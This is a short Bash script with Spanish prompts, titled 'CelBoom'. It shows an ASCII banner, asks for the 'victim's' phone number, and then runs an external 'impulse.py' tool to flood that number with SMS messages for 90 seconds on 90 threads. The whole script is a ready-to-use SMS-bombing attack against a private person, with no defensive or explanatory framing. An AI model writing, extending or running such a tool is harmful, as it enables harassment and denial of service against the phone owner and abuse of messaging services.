#!/bin/bash
#
# Created by: Monkey-hk4
#
# VARIABLES
#
PWD=$(pwd)
source ${PWD}/Colors.sh
#
# FUNCIONES
#
function CelBoom {
	sleep 0.5
	clear
echo -e "${rojo}
          ___  ____  __    ____  _____  _____  __  __ 
         / __)( ___)(  )  (  _ \(  _  )(  _  )(  \/  )
        ( (__  )__)  )(__  ) _ < )(_)(  )(_)(  )    ( 
         \___)(____)(____)(____/(_____)(_____)(_/\/\_)

                        by: Monkey-hk4                      
"
}
function PHONE {
echo -e -n "${cyan}
>> Ejemplo: +55111111111
>
Introduce el número de la víctima >> "${blanco}
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd
cd Impulse
python impulse.py --method SMS --time 90 --threads 90 --target ${phone}
